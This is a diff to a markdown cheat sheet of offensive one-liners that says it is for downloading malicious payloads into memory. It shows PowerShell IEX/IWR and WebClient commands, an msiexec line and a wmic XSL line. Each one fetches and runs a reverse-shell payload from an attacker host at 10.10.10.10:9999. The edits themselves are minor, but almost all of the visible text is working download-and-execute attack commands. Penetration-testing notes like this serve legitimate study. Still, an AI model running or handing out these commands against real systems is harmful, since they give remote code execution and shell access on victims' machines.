@@ -6,7 +6,7 @@ Simple One-Liners to download malicious payloads into memory & handy scripts
 
 **Powershell:**
 ```
-powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"
+powershell "IEX( IWR http://10.10.10.10:9999/rev.ps1 -UseBasicParsing)"
 
 powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:9999/test.bat'))
 
@@ -16,7 +16,7 @@ powershell -w -e <Encoded_Data>
 
 Script Arguments
 
-encoder.py <ip> <port>
+encoder.py IP PORT
 ```
 #!/usr/bin/env python3
 
@@ -94,7 +94,7 @@ msiexec /q /i http://10.10.10.10:9999/rev.msi
 ```
 wmic os get /FORMAT:"http://10.10.10.10:9999/rev.xsl"
 ```
-
+	
 # File Transfers (Linux)
 
 **Wget:**
